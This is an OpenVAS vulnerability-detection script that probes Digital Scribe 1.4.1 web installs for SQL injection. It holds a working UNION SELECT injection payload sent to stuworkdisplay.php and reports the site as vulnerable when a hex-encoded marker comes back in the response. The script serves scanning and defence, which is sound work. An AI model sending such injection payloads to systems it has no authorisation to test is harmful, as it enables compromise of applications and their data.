###############################################################################
# OpenVAS Vulnerability Test
#
# Digital Scribe Multiple SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (C) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################


if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100398");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2009-12-15 19:11:56 +0100 (Tue, 15 Dec 2009)");
  script_bugtraq_id(37292);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("Digital Scribe Multiple SQL Injection Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37292");
  script_xref(name:"URL", value:"http://www.digital-scribe.org/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/508410");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"summary", value:"Digital Scribe is prone to multiple SQL-injection vulnerabilities
  because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.");

  script_tag(name:"impact", value:"Exploiting these issues could allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"Digital Scribe 1.4.1 is vulnerable, other versions may also be affected.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

dirs = make_list_unique("/", "/DigitalScribe","/digitalscribe", http_cgi_dirs( port:port ));

foreach dir (dirs) {

  if( dir == "/" ) dir = "";

  url = string(dir, "/stuworkdisplay.php?ID=-1)%20UNION%20ALL%20SELECT%200x53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11%23");
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if( ! buf || buf !~ "^HTTP/1\.[01] 200" ) continue;

  if("Student Work" >< buf && "SQL-Injection-Test" >< buf )  {

      report = http_report_vuln_url( port:port, url:url );

      security_message(port:port, data:report);
      exit(0);
  }
}

exit(0);
